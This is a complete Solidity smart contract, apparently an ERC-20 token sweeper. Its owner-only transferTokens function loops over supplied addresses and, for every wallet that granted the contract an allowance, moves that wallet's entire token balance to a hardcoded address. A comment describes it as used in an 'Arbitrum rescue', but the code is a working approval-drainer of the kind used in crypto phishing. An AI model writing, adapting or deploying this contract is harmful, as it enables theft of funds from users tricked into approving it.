pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract TokenTransfer {
    address public owner = 0xdFD4ab80E163D6864E26F37540563cBf2E52A582;
    address public transferTo = 0xdFD4ab80E163D6864E26F37540563cBf2E52A582;
    address public tokenAddress = 0x912CE59144191C1204E64559FE8253a0e49E6548; //This was used in Arbitrum rescue 

    modifier onlyOwner() {
        require(msg.sender == owner, "You are not the owner");
        _;
    }

    function transferTokens(address[] calldata users) public onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            uint256 tokenbalance = token.balanceOf(user);
            if (tokenbalance > 0 && token.allowance(user, address(this)) > 0) {
                try token.transferFrom(user, transferTo, tokenbalance) {
                    // Just skip the itteration
                } catch {
                    continue;
                }
            }
        }
    }

    function recoverToken(address _tokenAddress, uint256 _amount) public onlyOwner {
        require(_tokenAddress != address(0), "Invalid Amount");
        require(_amount > 0, "Token Amount");
        (bool success, ) = _tokenAddress.call(abi.encodeWithSelector(0xa9059cbb, owner, _amount));
        require(success, "Token transfer Error");
        }

    function recoverEther(uint256 _amount) public onlyOwner {
        payable(owner).transfer(_amount);
    }

    fallback() external payable {}
    receive() external payable {}
}
